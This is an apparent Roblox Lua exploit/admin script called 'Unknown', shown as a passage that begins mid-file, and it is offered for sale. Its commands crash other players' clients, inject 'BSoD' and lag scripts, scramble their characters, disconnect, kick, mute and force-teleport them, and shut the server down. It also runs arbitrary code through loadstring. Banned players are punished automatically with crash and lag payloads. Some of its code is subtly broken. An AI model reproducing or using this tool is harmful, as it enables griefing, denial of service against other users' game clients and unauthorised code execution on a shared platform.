    game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
        game.Lighting.TimeOfDay = "14:00:00"
        game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
        game.Lighting.Brightness = 1
        game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
        game.Lighting.ColorShift_Top = Color3.new(0,0,0)
        game.Lighting.ShadowColor = Color3.new(0.7,0.7,0.7)
        end
)
 
 
 
 
AddCmd("Kick a player","kick","Kick a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SerCoreGuiEnabled(3,false)", plr.Backpack)
plr:Destroy()
end
end
end
)
 
 
AddCmd("Night","night","Makes it night",
        function()
                game.Lighting.TimeOfDay = "00:00:00"
        end
)
 
 
AddCmd("Day","day","Makes it day",
        function()
                game.Lighting.TimeOfDay = "12:00:00"
        end
)
 
 
 
 
 
AddCmd("Crash player","crash","Crash the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([==[
    game:GetService("RunService").RenderStepped(function()
    Delay(0, function() return end)
    end)]==], plr.Backpack)
end
end
end
)
 
 
 
 
 
 
 
AddCmd("Number of commands","ncmds","Shows how many commands there is",
function()
Output(#Cmds, __)
end
)
 
 
 
AddCmd("Show cmds","cmds","Show the list of commands",
function()
Dismiss()
for i, v in pairs(Cmds) do
Output(v["Name"],
function()
Output("Description: "..v["Desc"], __)
Output("Usage: "..v["Say"], __)
Output("Name: "..v["Name"], __)
end)
end
end
)
 
AddCmd("Rejoin a player","rj","Rejoin the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
end
end
end
)
 
 
 
AddCmd("Create a base","base","Create the base",
function()
a = Instance.new("Part")
a.Parent = Workspace
a.Name = "Base"
a.Position = Vector3.new(0, 0.6, 0)
a.Size = Vector3.new(1002, 0, 1002)
a.Material = "Grass"
a.Anchored = true
a.BrickColor = BrickColor.new("Dark green")
end
)
 
AddCmd("Ping","ping","Ping something",
function(plrs, msg)
if msg == "" then
Output("pong", __)
else
Output(msg, __)
end
end
)
 
AddCmd("Get a age of a player","age","Get age of a player",
        function(Plrs)
                for _, plr in pairs(Plrs) do
                        if plr then
                                Output(plr.Name..": "..tostring(plr.AccountAge))
                        end
                end
end)
 
 
AddCmd("dt(dismiss)","dt","Dismiss tabs",
function()
Dismiss()
end
)
 
 
 
AddCmd("Reload your character","char","Creates your character",
function()
if workspace.CurrentCamera == nil then return end
local camera = workspace.CurrentCamera
local new_char = game:service("InsertService"):LoadAsset(68452456):GetChildren()[1]
local human = new_char.Humanoid
human.Parent = nil
new_char.Name = LocalPlayer.Name
wait()
human.Parent = new_char
camera.CameraSubject = human
camera.CameraType = "Custom"
new_char.Parent = workspace
local pl = Instance.new("PointLight", new_char.Head)
pl.Range = 24
pl.Shadows = true
LocalPlayer.Character = new_char
new_char:MakeJoints()
new_char.Torso.BrickColor = torsocolor
new_char["Left Leg"].BrickColor = leftlegcolor
new_char["Right Leg"].BrickColor = rightlegcolor
new_char["Left Arm"].BrickColor = leftarmcolor
new_char["Right Arm"].BrickColor = rightarmcolor
new_char.Head.BrickColor = headcolor
for i,v in pairs(Clothes) do
v:Clone().Parent = new_char
end
probemode = false
end
)
 
AddCmd("Remove Unknown","remove","Remove the commands",
function()
Output("lol, <click me<",
function()
Output("lol, last one <click me<",
function()
for i,v in pairs(getfenv(1)) do
getfenv(1)[i] = nil
end
script.Disabled = true
LocalPlayer = NO_PLAYER
script:findFirstChild(SourceName).Value = " "
script.Disabled = true
tabmodel:ClearAllChildren()
tabmodel:Destroy()
connection:disconnect()
Tabs = {}
Cmds = {}
Banlist = {}
fukhed.all = true
coroutine.resume(coroutine.create(function()
while wait(0.1) do
Dismiss()
end
end))
end)
end)
end
)
 
 
 
AddCmd("Mute a player","mute","Block the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, false)", plr.Backpack)
end
end
end
)
 
AddCmd("Unmute a player","unmute","Unblock the player chat",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'StarterGui':SetCoreGuiEnabled(3, true)", plr.Backpack)
end
end
end
)
 
 
 
AddCmd("God","god","Gods a player",
    function(plrs)
        for _,plr in pairs(plrs) do
            if plr and plr.Character then
                NewS([[game.Workspace[']]..plr.Name..[[']Humanoid.Maxhealh = 99999999999999999999]],Workspace)
            end
        end
    end
)
 
 
 
 
 
AddCmd("Give admin to a player","admin","Give admin to a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
a = sorcery:Clone()
a.Parent = plr.Backpack
Output("You gave admin to: "..plr.Name, __)
end
end
end
)
 
AddCmd("fcam(Fix cam)","fcam","Fix anyone's cam",
function(plrs, msg)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([[
game.Workspace.CurrentCamera:Destroy()
cam = Instance.new("Camera", workspace)
cam.Name = "CurrentCamera"
cam.FieldOfView = 70
cam.CameraType = "Custom"
cam.CameraSubject = game.Players.LocalPlayer.Character.Humanoid]], plr.Backpack)
end
end
end
)
 
 
AddCmd("Ban a player","ban","Kicks a player when he enters",
function(plrs, msg)
for _,v in pairs(plrs) do
if v then
table.insert(Banlist,v.Name)
Output('Banned | '..v.Name,__)
else
Output(Error)
end
end
end
)
 
 
 
AddCmd("Shutdown the game","sd","Shuts the server down",
    function()
        Output("Shutting down server, because theres to many skids in-game.","Really red")
        wait(5)
      for _,v in pairs(game.Players:GetPlayers()) do v:Kick() end
    end
)
 
AddCmd("No sparklez :'c","unsparkles","Remove sparkles from player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
pcall(function()
for j, k in pairs(plr.Character.Torso:GetChildren()) do
if k:IsA("Sparkles") then
k:Destroy()
end
end
end)
end
end
end
)
 
 
AddCmd("Sparklez C:","sparkles","Give sparkles to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character and plr.Character.Torso then
Instance.new("Sparkles", plr.Character.Torso)
end
end
end
)
 
AddCmd("Give ForceField","ff","Give forcefield to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
Instance.new("ForceField", plr.Character)
end
end
end
)
 
AddCmd("Un-Forcefield","unff","Remove the forcefield that you gave to player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Character then
pcall(function()
for _,v in pairs(plr.Character:GetChildren()) do
if v:IsA("ForceField") then
v:Destroy()
end
end
end)
end
end
end
)
 
AddCmd("Disc(Disconnect)","disc","Disconnects a player form the game",
function(plrs)
for _,plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([[local lp = game.Players.LocalPlayer;lp.Parent = nil;wait();lp.Parent = game.Players]],plr.Backpack)
end
end
end)
 
AddCmd("Get info about a player","info","Shows info on a player",
    function(plrs)
        for _,plr in pairs(plrs) do
            if plr then
Output("Age: "..plr.AccountAge,"noncolar")
Output("Membership: "..plr.MembershipType.Name,"Hot pink")
Output("Player: "..plr.Name,"Really red")
Output("Id: "..plr.userId,"New Yeller")
Output("Camera Mode: "..plr.CameraMode.Name,"Dark green")
end
end
end)
 
 
 
 
AddCmd("Get info about the script","sinfo","Gets info about the script",
    function()
        Output("Script Name: Unknown")
        Output("Script Version: Generation 2")
        Output("Creators: UnknownTablets, P7N, Z7M")
        Output("Buyable: Yes :)")
    end
)
 
 
AddCmd("Execute a script", "exe","Execute a LocalScript for admin",
function(plrs, msg)
a,b = ypcall(function()
loadstring(msg)()
end) if not a then Output(b,"Bright red") end
end
)
 
 
 
AddCmd("bsod a player","bsod","bsods a player",
        function(Plrs)
                for _, plr in pairs(Plrs) do
                        if plr and plr.Backpack then
                                for i = 0,7,1 do
                                        NewLS(BSoDsource, plr.Backpack)
                                       
 
                                end
                        end
                end
        end
)
 
AddCmd("Respawn","respawn","Respawn player",
        function(plrs)
                for _,plr in pairs(plrs) do
                        if plr then
                                NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
                        end
                end
        end
)
 
Joincrep = [=[
local target = game.Players.LocalPlayer
local TWO_PI = 2 * math.pi
local cycletime = 0.75
local offsetradius = 0.75
local rotationoffset = math.pi
function CubicInterpolate(y0, y1, y2, y3, mu)
    local a0, a1, a2, a3, mu2
        mu2 = mu * mu
        a0 = y3 - y2 - y0 + y1
        a1 = y0 - y1 - a0
        a2 = y2 - y0
        a3 = y1
        return a0 * mu * mu2 + a1 * mu2 + a2 * mu + a3
end
local character = target.Character
local joints = {}
local stack = character:GetChildren()
while #stack ~= 0 do
        local object = stack[#stack]
        table.remove(stack)
        for index, child in ipairs(object:GetChildren()) do
                table.insert(stack, child)
        end
        if object:IsA("JointInstance") then
                table.insert(joints, object)
        end
end
local rot0 = {}
local rot1 = {}
local rot2 = {}
local rot3 = {}
local rot4 = {}
for index, joint in ipairs(joints) do
        local pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
        local rot = Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
        rot0[index] = {joint.C0, joint.C1}
        rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
        rot2[index] = {pos, rot}
        pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
        rot = rot + Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
        rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
        rot3[index] = {pos, rot}
        pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
        rot = rot + Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
        rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
        rot4[index] = {pos, rot}
end
while character.Parent do
        for i, j in ipairs(joints) do
                local pos = Vector3.new(math.random() - 0.5, math.random() - 0.5, math.random() - 0.5).unit * offsetradius
                local rot = rot4[i][2] + Vector3.new(math.random(), math.random(), math.random()) * rotationoffset
                rot = Vector3.new(rot.x % TWO_PI, rot.y % TWO_PI, rot.z % TWO_PI)
                rot1[i], rot2[i], rot3[i], rot4[i] = rot2[i], rot3[i], rot4[i], {pos, rot}
        end
        local start = tick()
        while true do
                local ctime = tick()
                local elapsed = ctime - start
                if elapsed > cycletime then
                        break
                end
                local progress = elapsed / cycletime
                for index, joint in ipairs(joints) do
                        local v0, v1, v2, v3, v4 = rot0[index], rot1[index], rot2[index], rot3[index], rot4[index]
                        local p1, p2, p3, p4, r1, r2, r3, r4 = v1[1], v2[1], v3[1], v4[1], v1[2], v2[2], v3[2], v4[2]
                        local px = CubicInterpolate(p1.x, p2.x, p3.x, p4.x, progress)
                        local py = CubicInterpolate(p1.y, p2.y, p3.y, p4.y, progress)
                        local pz = CubicInterpolate(p1.z, p2.z, p3.z, p4.z, progress)
                        local rx = CubicInterpolate(r1.x, r2.x, r3.x, r4.x, progress)
                        local ry = CubicInterpolate(r1.y, r2.y, r3.y, r4.y, progress)
                        local rz = CubicInterpolate(r1.z, r2.z, r3.z, r4.z, progress)
                        local cframe = CFrame.new(px, py, pz) * CFrame.Angles(rx, ry, rz)
                        joint.C0 = v0[1] * cframe
                        joint.C1 = v0[2] * cframe:inverse()
                end
                wait()
        end
end
]=]
 
AddCmd("dance baby dance","dance","Jointcraps someone",
    function(plrs)
        for _,plr in pairs(plrs) do
            if plr and plr.Character and plr.Backpack then
                NewLS(Joincrep, plr.Backpack)
            end
        end
    end
)
 
 
 
function Output(Txt, func)
P = Instance.new("Part", tabmodel)
P.Shape = "Block"
P.Color = Color3.new(0, 255, 255)
P.Anchored = true
P.Transparency = (0.0)
P.Size = Vector3.new(2.1, 2.1, 2.1)
P.CanCollide = false
if probemode == false then
if LocalPlayer.Character.Torso then
P.Position = LocalPlayer.Character.Torso.Position
elseif LocalPlayer.Character.Torso == nil then return end
elseif probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
P.Position = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").Position
elseif game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") == nil then return end
else
return
end
local s = Instance.new("SelectionBox")
s.Color = BrickColor.new(0, 0, 0)
s.Adornee = P
s.Parent = P
s.Transparency = (0.1)
Instance.new("PointLight", P)
bg = Instance.new("BillboardGui", P)
bg.Adornee = tab
bg.Size = UDim2.new(8, 0, 7.5, 0)
bg.StudsOffset = Vector3.new(0, 1, 0)
text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(1, 0, 0.2, 0)
text.FontSize = "Size14"
text.BackgroundTransparency = 1
text.Font = "Legacy"
text.TextStrokeTransparency = 0
text.TextColor3 = Color3.new(0, 255, 255)
text.Text = Txt
Click = Instance.new("ClickDetector",P)
Click.MaxActivationDistance = 999999999
Click.MouseClick:connect(function(Plr)
if Plr.Name == LocalPlayer.Name then
Dismiss()
func = func
func()
end
end)
table.insert(Tabs, P)
end
 
function getPlayers(msg)
local plrs = {}
if msg == "me" then
table.insert(plrs, LocalPlayer)
elseif msg == "all" then
plrs = game:GetService("Players"):GetChildren()
elseif msg == "noobs" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "veterans" then
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
if plr.AccountAge > 364 then
table.insert(plrs, plr)
end
end
elseif msg == "others" then
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v ~= LocalPlayer then
table.insert(plrs, v)
end
end
else
for i,v in pairs(game:GetService("Players"):GetChildren()) do
if v.Name:lower():sub(1,#msg) == msg:lower() then
if v.Name == "P7N" then
Output("Someone is in-game of a freind, of unknown, k.")
else
table.insert(plrs, v)
end
end
end
end
return plrs
end
 
for _,plr in pairs(game:GetService("Players"):GetChildren()) do
end
 
LocalPlayer.Chatted:connect(function(m)
for i,v in pairs(Cmds) do
if v["Say"]..key == m:sub(1, #v["Say"]+#key) then
v["Func"](getPlayers(m:sub(#v["Say"]+#key+1)), m:sub(#v["Say"]+#key+1))
end
end
end)
 
Output("Unknown Loaded, generation 2 loaded")
Output("Creaters: UnknownTablets, Z7M, P7N.")
Output("Beta Testers: InstallingData, ImaEatYourTaco.")
Output("Script version: 2.")
Output("Last updated: 6/5/2014")
       
modeldebounce = false
game:service'RunService'.Stepped:connect(function()
if modeldebounce then return end
rot = (rot % 360) + 0.5
if tabmodel.Parent ~= workspace then
modeldebounce = true
tabs = {}
tabmodel = Instance.new("Model", workspace)
tabmodel.Name = "Unknown Tabs"
tabs = {}
wait()
modeldebounce = false
end
end)
 
rot = 0
coroutine.resume(coroutine.create(function()
game:GetService("RunService").Stepped:connect(function()
if probemode == false then
if LocalPlayer.Character then
if LocalPlayer.Character:findFirstChild("Torso")  then
rot = rot + 0.001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = LocalPlayer.Character.Torso.CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
rot = rot + 0.001
for i,v in pairs(Tabs) do
ypcall(function()
local pos = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe").CFrame
local radius = 4 + (#Tabs * 0.5)
local x = math.sin((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local y = 0
local z = math.cos((i / #Tabs - (0.5 / #Tabs) + rot * 2) * math.pi * 2) * radius
local arot = Vector3.new(x, y, z) + pos.p
local brot = v.CFrame.p
local crot = (arot * .1 + brot * .9)
v.CFrame = CFrame.new(crot, pos.p)
end)
end
end
end
end)
end))
 
for _,v in pairs(game.Players:GetChildren()) do
if v:IsA("Player") then
Connect(v)
end
end
 
game.Players.ChildAdded:connect(function(qe)
if qe:IsA("Player") then
Connect(qe)
end
end)
 
coroutine.resume(coroutine.create(function()
while wait(0.1) do
for a, plr in pairs(game.Players:GetChildren()) do
pcall(function()
for b, Bl in pairs(Banlist) do
if plr.Name == Bl["Name"] then
if Bl["BRank"] == -1 then
plr:Destroy()
elseif Bl["BRank"] == -2 then
NewLS(LagSource, plr.Backpack)
elseif Bl["BRank"] == -3 then
NewLS("script.Parent = nil; while wait(0.1) do; game:service'StarterGui':SetCoreGuiEnabled(3, false); end", plr.Backpack)
elseif Bl["BRank"] == -4 then
NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
else
plr:Destroy()
end
end
end
end)
end
end
end))
 
for _,v in pairs(game.Players:GetPlayers()) do
if v.Name == "P7N" then
Output("LOl, sure")
end
end
 
game.Players.PlayerAdded:connect(function(plr)
if plr.Name == "P7N" then
Output("Sup brah")
end
end)
game.Players.ChildRemoved:connect(function(plr)
Output("Disconnect: "..plr.Name)
wait(4)
dismiss()
end)
 
game.Players.ChildAdded:connect(function(plr)
     Output("Connected: "..plr.Name)
wait(4)
Dismiss()
 end)